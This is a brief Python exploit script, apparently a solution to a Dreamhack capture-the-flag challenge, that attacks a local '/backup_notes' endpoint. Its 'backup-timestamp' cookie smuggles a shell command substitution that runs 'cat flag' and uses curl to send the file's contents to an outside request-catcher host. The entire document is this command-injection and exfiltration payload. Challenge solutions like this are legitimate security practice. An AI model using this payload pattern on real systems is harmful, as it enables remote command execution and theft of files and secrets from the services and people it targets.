import requests

url = "http://localhost:5001"
request_bin = "https://nmuykwa.request.dreamhack.games"

cookie = {
    "backup-timestamp": f"$(curl {request_bin} -d {{`cat flag`}})"
}

resp = requests.post(url + "/backup_notes", cookies=cookie)
print(resp)
